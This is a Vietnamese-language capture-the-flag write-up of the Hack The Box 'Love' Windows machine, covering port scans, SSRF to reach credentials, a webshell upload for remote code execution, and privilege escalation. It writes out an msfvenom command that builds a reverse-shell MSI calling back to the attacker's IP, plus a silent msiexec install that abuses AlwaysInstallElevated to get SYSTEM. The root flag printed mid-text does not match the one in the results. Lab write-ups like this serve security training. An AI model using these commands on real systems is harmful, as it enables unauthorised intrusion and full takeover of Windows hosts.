![image](https://hackmd.io/_uploads/rkNQQXqtC.png)

# Machine info and Comment
## Machine info
Love is an easy windows machine where it features a voting system application that suffers from an authenticated remote code execution vulnerability. Our port scan reveals a service running on port 5000 where browsing the page we discover that we are not allowed to access the resource. Furthermore a file scanner application is running on the same server which is though effected by a SSRF vulnerability where it&amp;amp;#039;s exploitation gives access to an internal password manager. We can then gather credentials for the voting system and by executing the remote code execution attack as phoebe user we get the initial foothold on system. Basic windows enumeration reveals that the machine suffers from an elevated misconfiguration. Bypassing the applocker restriction we manage to install a malicious msi file that finally results in a reverse shell as the system account.

## Comment

# Recon
## nmap
Sau khi nmap ta thấy nó scan được 7 port http, https và của smb 
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sS 10.10.10.239
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-03 03:17 EDT
Nmap scan report for 10.10.10.239
Host is up (0.23s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
3306/tcp open  mysql
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 9.04 seconds
```
Từ đây, ta sẽ scan tiếp các port này xem có gì để khai thác

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sCV -n -p80,135,139,443,445,3306,5000 10.10.10.239 
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-03 03:38 EDT
Nmap scan report for 10.10.10.239
Host is up (0.23s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: Voting System using PHP
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host '10.10.14.93' is not allowed to connect to this MariaDB server
5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.94SVN%I=7%D=8/3%Time=66ADDE90%P=x86_64-pc-linux-gnu%r(
SF:NULL,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.93'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 21m31s, deviation: 0s, median: 21m31s
| smb2-time: 
|   date: 2024-08-03T08:00:43
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.79 seconds
```
## Port 80 - http
Sử dụng port 80 thì nó ra trang login này

![image](https://hackmd.io/_uploads/ryewmviF0.png)

`robots.txt` và sau đó dùng `gobuster` để tìm các path ẩn nhưng không mấy khả quan:

### robots.txt

![image](https://hackmd.io/_uploads/H1fe4DoFC.png)

### gobuster
Sau khi kết thúc scan cũng không mấy khả quan trong đó có duy nhất 1 path truy cập được đó là `/admin`
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.10.239 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.239
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 338] [--> http://10.10.10.239/images/]
/Images               (Status: 301) [Size: 338] [--> http://10.10.10.239/Images/]
/admin                (Status: 301) [Size: 337] [--> http://10.10.10.239/admin/]
/plugins              (Status: 301) [Size: 339] [--> http://10.10.10.239/plugins/]
/includes             (Status: 301) [Size: 340] [--> http://10.10.10.239/includes/]
/examples             (Status: 503) [Size: 402]
/dist                 (Status: 301) [Size: 336] [--> http://10.10.10.239/dist/]
/licenses             (Status: 403) [Size: 421]
/IMAGES               (Status: 301) [Size: 338] [--> http://10.10.10.239/IMAGES/]
/%20                  (Status: 403) [Size: 302]
Progress: 5875 / 220561 (2.66%)[ERROR] Get "http://10.10.10.239/nav_contact": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 5964 / 220561 (2.70%)[ERROR] Get "http://10.10.10.239/ex": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 6066 / 220561 (2.75%)[ERROR] Get "http://10.10.10.239/philanthropy": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/Admin                (Status: 301) [Size: 337] [--> http://10.10.10.239/Admin/]
/*checkout*           (Status: 403) [Size: 302]
/Plugins              (Status: 301) [Size: 339] [--> http://10.10.10.239/Plugins/]
/phpmyadmin           (Status: 403) [Size: 302]
/webalizer            (Status: 403) [Size: 302]
/*docroot*            (Status: 403) [Size: 302]
/*                    (Status: 403) [Size: 302]
<SNIP>
```

![image](https://hackmd.io/_uploads/ryqdNwiKA.png)

Có điều xảy ra đó là khi login với user `admin` nó sẽ trả về error như trên nhưng với random user thì nó lại trả về error khác. Điều này nghĩ đến việc brute-force password

![image](https://hackmd.io/_uploads/SJkSSdjFC.png)

Tiếp tục treo và chuyển qua các port khác

## Port 443 - https
Sau khi scan nmap ở trên, ta có được một subdomain `staging.love.htb` từ việc trích xuất SSL-cert

![image](https://hackmd.io/_uploads/rk3T5OjtR.png)

## Port 445 - smb
## SMBclient 
Ta sẽ kiểm tra xem máy chủ này có shared folder nào không
```
┌──(kali㉿kali)-[~]
└─$ smbclient -N -L //10.10.10.239
session setup failed: NT_STATUS_ACCESS_DENIED
```
Lỗi này trả về có nghĩa là không có quyền truy cập

## Port 3306 - mysql
Cố gắng kết nối đến mysql nhưng nó cũng không có quyền truy cập 
```
┌──(kali㉿kali)-[~]
└─$ mysql -h 10.10.10.239
ERROR 1130 (HY000): Host '10.10.14.93' is not allowed to connect to this MariaDB server
```

## Port 5000 - upnp
UPnP là một giao thức mạng (hay thực tế là một bộ các giao thức mạng). Các giao thức này phác thảo một phương thức giao tiếp cụ thể mà mọi loại thiết bị có thể sử dụng để liên lạc ngay lập tức với nhau trên mạng. Thật không may, một số interface kiểm soát UPnP có thể được hiển thị với Internet công cộng, cho phép kẻ xấu tìm và truy cập vào những thiết bị riêng tư của bạn.

Vì thế nên một port dễ có lỗ hổng như thế này có khả năng trở thanh mục tiêu khai thác vào

![image](https://hackmd.io/_uploads/r1Kt6dstA.png)

# User flag
## Exploit
### SSRF
Như đã recon ở trên cộng với việc trang web có tính năng `Fetch URL` ta có thể nghĩ đến việc khai thác SSRF

![image](https://hackmd.io/_uploads/rk7jxKsYC.png)

Có được credential login vào admin 

![image](https://hackmd.io/_uploads/S1bReFjtA.png)

Quay lại `/admin`

![image](https://hackmd.io/_uploads/SJ0XZKoYA.png)

### File Upload to RCE
Trang web này có một số tính năng như thêm, tìm kiếm nhưng không khai thác được gì trong đó đặc biệt là việc upfile lên nhưng không hề bị chặn khi up các file như webshell

![image](https://hackmd.io/_uploads/rJy3EpsF0.png)

Vậy là RCE thành công

![image](https://hackmd.io/_uploads/BJiSt6ot0.png)

## Post-Exploit

![image](https://hackmd.io/_uploads/rJftF6oFC.png)

# Root flag 
## Exploit
Lợi dụng việc có thể tùy ý upload file lên server, ta sẽ tiếp tục up các file độc lên server. Trong đó cần 1 [revershell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)

![image](https://hackmd.io/_uploads/ryZjby3t0.png)

Sau khi chạy file ta sẽ thây cả cac file đã được upload lên trươc đó

![image](https://hackmd.io/_uploads/SJ9nKk2KA.png)

### winPEASx64.exe
Nó sẽ check các chỗ có thể leo quyền

![image](https://hackmd.io/_uploads/S1Uv2RsFA.png)

```
C:\xampp\htdocs\omrs\images>Powershell 
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\xampp\htdocs\omrs\images> ./winPEASx64.exe
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and 
<SNIP>
```

Các tệp trình cài đặt Windows (còn được gọi là tệp .msi) được sử dụng để cài đặt các ứng dụng trên hệ thống. Chúng thường chạy với cấp đặc quyền của người dùng khởi động nó. Tuy nhiên, chúng có thể được cấu hình để chạy với đặc quyền cao hơn từ bất kỳ tài khoản người dùng nào (ngay cả những tài khoản không có đặc quyền). Điều này có khả năng cho phép chúng ta tạo một tệp .msi độc hại chạy với đặc quyền của quản trị viên.

![image](https://hackmd.io/_uploads/SklnTCiKR.png)

### Msfvenom
Từ trên tạo file `.msi` độc hại bằng cách sử dụng msfvenom

```
┌──(kali㉿kali)-[~/Downloads]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.93 LPORT=1414 -f msi -o malicious.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: malicious.msi
```
Chạy trình cài đặt bằng lệnh bên dưới và nhận reverse shell:
```
C:\xampp\htdocs\omrs\images>msiexec /quiet /qn /i C:\xampp\htdocs\omrs\images\malicious.msi
```

![image](https://hackmd.io/_uploads/r1P6AJ3KA.png)

## Post-Exploit
Sử dụng lệnh cuối để lấy được flag
```
C:\WINDOWS\system32>type C:\Users\Administrator\Desktop\root.txt 
type C:\Users\Administrator\Desktop\root.txt
5ef49ca9ed215c3a3a3bdb8f9f225363
```

# Results 
1. Submit User flag --> 5375d5a96c7e355*****
2. Submit Root flag --> d18fa9796365489********

![image](https://hackmd.io/_uploads/BJftQCjKR.png)
